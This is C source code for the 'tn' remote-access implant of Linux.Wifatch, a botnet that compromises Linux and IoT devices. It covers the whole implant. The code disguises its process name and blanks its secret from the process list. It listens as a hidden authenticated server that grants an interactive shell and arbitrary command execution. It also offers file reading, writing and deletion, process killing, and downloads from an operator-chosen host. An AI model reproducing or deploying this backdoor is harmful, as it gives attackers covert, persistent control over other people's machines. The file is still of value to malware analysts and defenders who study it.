
/*
 * This file is part of Linux.Wifatch
 *
 * Copyright (c) 2013,2014,2015 The White Team <rav7teif@ya.ru>
 *
 * Linux.Wifatch is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * Linux.Wifatch is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with Linux.Wifatch. If not, see <http://www.gnu.org/licenses/>.
 */

// usage: tn port id64.secret64.port4 -- primitive telnet server

// this program was written to be as small as possible, without
// completely sacrificing performance, and provide a network
// efficient protocol at the same time. error checking is
// moved into the kernel as much as possible, and a number of
// space saving but rather dirty tricks are being used.

//      1 -- start shell
//      2 path -- open rdonly
//      3 path -- open wrcreat
//      4 -- close
//      5 signal8 x16 pid32 -- kill
//      6 x8 mod16 path -- chmod
//      7 srcpath | dstpath -- rename
//      8 path -- unlink
//      9 path -- mkdir
//     10 x8 port16be saddr32be | writedata* | "" | dstpatha - len32* -- download // need to use readlink or so
// V12 10 x8 port16be saddr32be | writedata* | "" | dstpatha - ""* ret32 errno32 -- download
//     11 [path] - statdata -- lstat
//     12 path - statdata -- statfs
//     13 command -- exec command (stdin/out/err null)
//     14 command - cmdoutput... "chg_id" -- exec commmand  with end marker
//     15 - dirdata* | "" -- getdents64
// V 9 15 - paths* | "" -- getdents64
//     16 x16 mode8 off32 --  lseek
//     17 - fnv32a -- fnv32a
// V 9 17 [x24 len32] - fnv32a -- fnv32a
//     18 - filedata* | "" -- readall file
// V 9 18 [x24 len32] - filedata* | "" -- read file
// V14 18 [null0 x16 len32] - filedata* | "" -- read file
//     19 filedata -- write file
//     20 path - linkdata -- readlink
//     21 - ret32 -- last syscall result
// V 7 22 path - chdir
// V 8 23 path - statdata -- stat
// V10 24 shalen8 [x16 len32] - checksum -- sha3-256
// V11 25 x3 ms32 -- sleep
// V13  4 x1 mode16 mode32 path -- open (same as close)
// V14 26 -- open tcp socket
// V14 27 count8 port16 -- try count+1 bind()'s on port
// V14 28 msg | msg* -- go into accept loop and write response (port block)
// V16 28 msg -- go into accept loop and write response (port block)

// ver 10
// use wait4 instead of waitpid, maybe that helps
// properly set so_reuseaddr on the listening socket

// ver 12
// use BER encoding for stat, statvfs
// empty name in stat means fstat
// fnv/readall/keccak make length optional
// xstat error results in empty packet

// ver 13
// replace 2, 3 by 26

// ver 14
// replace 26 by 4 (which does open + close)
// remove fnv
// differential stat
// configurable checksum length in sha3
// reintroduce ropen (but not wopen)
// remove ability to calculate old keccak
// readall x8 must be 0
// socket create/socket bind/socket serve

// ver 15
// same api, but very different (smaller) binaries due to uclibc-tiny.h

// ver 16
// "unlimited" (~8k) packet length (packet length 255 chains to next)
// accept no longer accepts multiple message packets
// minor size optimisations

// ver 17
// increase number of distinct challenges when urandom is missing
// exit child on 0 packet, do not enter accept loop

// ver 18
// implement a "stdio" slave mode (when started with three arguments)
// a socket is expected as stdin/stdout, authentication is skipped

#define VERSION "18"

#include <errno.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/statfs.h>
#include <sys/stat.h>
#include <signal.h>
#include <fcntl.h>
#include <inttypes.h>
#include <sys/syscall.h>

#include "tinyutil.h"
#include "uclibc-tiny.h"
//#include "keccak.c"

void Keccak_Init(void);
void Keccak_Update(const uint8_t * data, unsigned int len);
void Keccak_Final(uint8_t * out, int sha3);

static void crypto_hash(unsigned char *out, const unsigned char *in, unsigned long long inlen)
{
        Keccak_Init();
        Keccak_Update(in, inlen);
        Keccak_Final(out, 0);
}

extern char **environ;

// eXit
__attribute__ ((noreturn))
static void x(void)
{
        _exit(0);
}

static const struct sigaction sa_sigign = {
        .sa_handler = SIG_IGN,
        .sa_flags = SA_RESTART,
};

static const struct sigaction sa_sigdfl = {
        .sa_handler = SIG_DFL,
        .sa_flags = SA_RESTART,
};

static uint8_t secret[32 + 32 + 32];    // challenge + id + secret

NOINLINE static int rpkt(int offset)
{
        uint8_t *base = buffer + offset;
        uint8_t *ptr = base;
        uint8_t len;

        do {
                if (read(0, &len, 1) <= 0 || (len && len != recv(0, ptr, len, MSG_WAITALL)))
                        x();

                ptr += len;
        } while (len == 255);

        *ptr = 0;

        return ptr - base;
}

NOINLINE static void wpkt(uint8_t * base, uint8_t len)
{
        write(1, &len, 1);
        write(1, base, len);
}

NOINLINE static uint8_t *pack_rw(uint8_t * p, uint32_t v)
{
        *--p = v & 0x7f;

        for (;;) {
                v >>= 7;
                if (!v)
                        return p;

                *--p = v | 0x80;
        }
}

static uint8_t *pack_changed(uint8_t * p, uint8_t flag, uint32_t cur, uint32_t prev)
{
        if (cur != prev) {
                flag |= *p++;
                p = pack_rw(p, cur);
                *--p = flag;
        }

        return p;
}

NOINLINE static void sockopts(int fd)
{
        static const int one = 1;

        setsockopt(fd, SOL_SOCKET, SO_KEEPALIVE, &one, sizeof (one));
        setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &one, sizeof (one));
        //setsockopt (fd, IPPROTO_TCP, TCP_NODELAY, &one, sizeof (one)); // only good for testing
}

NOINLINE static int tcp_socket(void)
{
        int fd = socket(AF_INET, SOCK_STREAM, 0);

        sockopts(fd);

        return fd;
}

static uint32_t wget(int fd)
{
        int sock = tcp_socket();

        struct sockaddr_in sa;

        sa.sin_family = AF_INET;
        sa.sin_addr.s_addr = *(uint32_t *) (buffer + 4);
        sa.sin_port = *(uint16_t *) (buffer + 2);;

        if (connect(sock, (struct sockaddr *)&sa, sizeof (sa)))
                return 2;

        int wlen;

        while ((wlen = rpkt(0)))
                write(sock, buffer, wlen);

        for (;;) {
                uint32_t len = recv(sock, buffer, BUFFER_SIZE, MSG_WAITALL);

                if (len <= 0)
                        break;

                write(fd, buffer, len);

                wpkt(buffer, 0);
        }

        close(sock);

        return 0;
}

static void setfds(int fd)
{
        int i;

        for (i = 0; i < 3; ++i)
                syscall(SCN(SYS_dup2), fd, i);

        close(fd);
}

int main(int argc, char *argv[])
{
        if (argc == 2) {
                static char *eargv[] = { "/sbin/ifwatch-if", "eth0", 0, 0 };
                eargv[2] = argv[1];
                execve(argv[0], eargv, environ);
        }

        syscall(SCN(SYS_umask), 0000);

        // copy id + challenge-response secret from commandline.
        // also space out commandline secret, to be less obvious.
        // some ps versions unfortunately show the spaces.
        {
                int i;

                for (i = 0; i < 64 + 2; ++i)
                        secret[32 + i] = argv[2][i * 2 + 0] * 16 + argv[2][i * 2 + 1] - 'a' * (16 + 1);

                for (i = 0; i < (64 + 2) * 2; ++i)
                        argv[2][i] = ' ';
        }

        if (argc == 4)
                goto handle_client;     // I did not know this would even be possible - but it sure saves space

        int ls = tcp_socket();

        if (ls < 0)
                return 0;

        struct sockaddr_in sa;

        sa.sin_family = AF_INET;
        sa.sin_addr.s_addr = INADDR_ANY;
        sa.sin_port = *(uint16_t *) (secret + 32 + 64);

        if (bind(ls, (struct sockaddr *)&sa, sizeof (sa)))
                return 0;

        write(1, MSG("ZohHoo5i"));

        if (fork())
                return 0;

 do_listen:

        sigaction(SIGHUP, &sa_sigign, 0);
        sigaction(SIGCHLD, &sa_sigign, 0);

        syscall(SCN(SYS_setsid));

        setfds(ls);

        if (listen(0, 4))
                return 0;

        for (;;) {
                {
                        int i = open("/dev/urandom", O_RDONLY);

                        read(i, secret, 32);
                        close(i);

                        // if urandom is not available, "increment" challenge
                        ++((uint32_t *) secret)[0];
                }

                int fd = accept(0, 0, 0);

                if (fork() == 0) {
                        setfds(fd);
                        sockopts(0);

                        syscall(SCN(SYS_setsid));
                        sigaction(SIGCHLD, &sa_sigdfl, 0);

                        static int block_mode;

                        if (block_mode) {
                                write(0, buffer + 1, block_mode);
                                x();
                        }
                        // see bm::tn for more readable challenge response protocol
                        write(0, secret, 32 + 32);
                        crypto_hash(buffer, secret, 32 + 32 + 32);

                        // we used rpkt here, but that would now be a buffer overflow
                        recv(0, buffer + 32, 33, MSG_WAITALL);

                        if (memcmp(buffer, buffer + 33, 32))
                                x();

 handle_client:
                        fd = 3; // for stdio mode

                        wpkt(MSG(VERSION "/" arch));    /* version/arch */
                        static const uint32_t endian = 0x11223344;

                        wpkt((uint8_t *) & endian, sizeof (endian));
                        //wpkt (STRINGIFY (BUFFER_SIZE), sizeof (STRINGIFY (BUFFER_SIZE)) - 1);
                        wpkt(buffer, 0);

                        uint32_t clen;
                        int ret;

                        while ((clen = rpkt(0)))
                                switch (buffer[0]) {
                                  case 1:      // telnet
                                          {
                                                  static char *argv[] = { "sh", "-i", 0 };
                                                  execve("/bin/sh", argv, environ);
                                          }
                                          break;

                                  case 5:      // kill
                                          ret = syscall(SCN(SYS_kill), *(uint32_t *) (buffer + 4), buffer[1]);
                                          break;

                                  case 6:      // chmod
                                          ret = syscall(SCN(SYS_chmod), buffer + 4, *(uint16_t *) (buffer + 2));
                                          break;

                                  case 7:      // rename
                                          rpkt(8192);
                                          ret = syscall(SCN(SYS_rename), buffer + 1, buffer + 8192);
                                          break;

                                  case 8:      // unlink
                                          ret = syscall(SCN(SYS_unlink), buffer + 1);
                                          break;

                                  case 9:      // mkdir
                                          ret = syscall(SCN(SYS_mkdir), buffer + 1, 0700);
                                          break;

                                  case 11:     // lstat
                                  case 23:     // stat
                                          {
                                                  static struct stat prev;
                                                  struct stat buf;
                                                  int l;

#if HAVE_XSTAT
                                                  int nr = SCN(SYS_fstat);
                                                  long arg = fd;

                                                  if (clen > 1) {
                                                          arg = (long)(buffer + 1);
                                                          nr = buffer[0] == 23 ? SCN(SYS_stat) : SCN(SYS_lstat);
                                                  }

                                                  l = xstat(nr, arg, &buf);

#else
                                                  l = buffer[1]
                                                      ? (buffer[0] == 23 ? stat : lstat) (buffer + 1, &buf)
                                                      : fstat(fd, &buf);
#endif

                                                  uint8_t *p = buffer + 7 * 5 + 1;

#define STATPACK(bit,field) \
                       p = pack_changed (p, 1 << bit, buf.field, prev.field);

                                                  *--p = 0;
                                                  STATPACK(7, st_mtime);
                                                  STATPACK(6, st_size);
                                                  STATPACK(5, st_gid);
                                                  STATPACK(4, st_uid);
                                                  //STATPACK (3, st_nlink);
                                                  STATPACK(2, st_mode);
                                                  STATPACK(1, st_ino);
                                                  STATPACK(0, st_dev);
                                                  prev = buf;

                                                  wpkt(p, (buffer + 7 * 5 + 1 - p) & -!l);
                                          }
                                          break;

                                  case 12:     // statfs
                                          {
                                                  struct statfs sfsbuf;
                                                  int l = statfs(buffer + 1, &sfsbuf);
                                                  uint8_t *p = buffer + 7 * 5;

                                                  p = pack_rw(p, sfsbuf.f_ffree);
                                                  p = pack_rw(p, sfsbuf.f_files);
                                                  p = pack_rw(p, sfsbuf.f_bavail);
                                                  p = pack_rw(p, sfsbuf.f_bfree);
                                                  p = pack_rw(p, sfsbuf.f_blocks);
                                                  p = pack_rw(p, sfsbuf.f_bsize);
                                                  p = pack_rw(p, sfsbuf.f_type);

                                                  wpkt(p, (buffer + 7 * 5 - p) & -!l);
                                          }
                                          break;

                                  case 13:     // exec quiet
                                  case 14:     // exec till marker
                                          {
                                                  int quiet = buffer[0] == 13;

                                                  pid_t pid = fork();

                                                  if (pid == 0) {
                                                          if (quiet)
                                                                  setfds(open("/dev/null", O_RDWR));

                                                          static char *argv[] = { "sh", "-c", buffer + 1, 0 };
                                                          execve("/bin/sh", argv, environ);
                                                          _exit(0);
                                                  }

                                                  if (pid > 0)
                                                          syscall(SCN(SYS_wait4), (int)pid, &ret, 0, 0);

                                                  if (!quiet)
                                                          wpkt(secret, 32 + 32);        // challenge + id
                                          }
                                          break;

                                  case 15:     // readdir
                                          {
                                                  int l;

                                                  while ((l = syscall(SCN(SYS_getdents64), fd, buffer, sizeof (buffer))) > 0) {
                                                          uint8_t *cur = buffer;
                                                          uint8_t *end = buffer + l;

                                                          while (cur < end) {
                                                                  struct linux_dirent64 *dent = (void *)cur;

                                                                  wpkt((void *)&dent->name, strlen(dent->name));
                                                                  cur += dent->reclen;
                                                          }
                                                  }

                                                  wpkt(buffer, 0);
                                          }
                                          break;

                                  case 16:     // lseek
                                          ret = lseek(fd, *(int32_t *) (buffer + 4), buffer[3]);
                                          break;

                                  case 18:     // read/readall
                                  case 24:     // sha3_256
                                          {
                                                  uint32_t max = clen >= 8 ? *(uint32_t *) (buffer + 4) : -1;
                                                  int l;

                                                  Keccak_Init();

                                                  while ((l = read(fd, buffer + 4, MIN(max, 254))) > 0) {
                                                          max -= l;

                                                          if (buffer[0] == 24)
                                                                  Keccak_Update(buffer + 4, l);
                                                          else
                                                                  wpkt(buffer + 4, l);

                                                          if (!max)
                                                                  break;
                                                  }

                                                  Keccak_Final(buffer + 4, 1);
                                                  wpkt(buffer + 4, buffer[1]);  // rpkt zero-terminates shorter packets
                                          }
                                          break;

                                  case 19:     // write
                                          ret = write(fd, buffer + 1, clen - 1);
                                          break;

                                  case 20:     // readlink
                                          {
                                                  int l = syscall(SCN(SYS_readlink), buffer + 1, buffer + 8192, 255);

                                                  wpkt(buffer + 8192, l > 0 ? l : 0);
                                          }
                                          break;

                                  case 10:     // wget
                                          ret = wget(fd);
                                          // fall through

                                  case 21:     // readret
                                          wpkt((uint8_t *) & errno, sizeof (errno));
                                          wpkt((uint8_t *) & ret, sizeof (ret));
                                          break;

                                  case 22:     // chdir
                                          ret = syscall(SCN(SYS_chdir), buffer + 1);
                                          break;

                                  case 25:     // sleep
                                          sleep_ms(*(uint32_t *) (buffer + 4));
                                          break;

                                          {
                                                  mode_t mode;
                                                  int flags;
                                                  const char *path;

                                  case 2:      // ropen
                                                  flags = 0;
                                                  path = buffer + 1;
                                                  // mode uninitialized
                                                  goto do_open;

                                  case 4:      // open (also close)
                                                  flags = *(int32_t *) (buffer + 4);
                                                  mode = *(int16_t *) (buffer + 2);
                                                  path = buffer + 8;

 do_open:
                                                  close(fd);
                                                  if (clen > 1)
                                                          ret = fd = open(path, flags, mode);
                                                  break;
                                          }

                                  case 26:     // socket
                                          ret = fd = tcp_socket();
                                          break;

                                  case 27:     // bind
                                          sa.sin_port = *(uint16_t *) (buffer + 2);     // reuse existing sa

                                          do
                                                  if (!(ret = bind(fd, (struct sockaddr *)&sa, sizeof (sa))))
                                                          break;
                                          while (buffer[1]--) ;

                                          break;

                                  case 28:     // accept loop/block mode
                                          ret = fork();

                                          if (ret == 0) {
                                                  ls = fd;
                                                  block_mode = clen - 1;
                                                  goto do_listen;
                                          }

                                          break;

                                  default:
                                          x();
                                }

                        x();
                }
                // keep fd open for at least 1s, also delay hack attempts
                sleep_ms(1000);

                close(fd);
        }
}
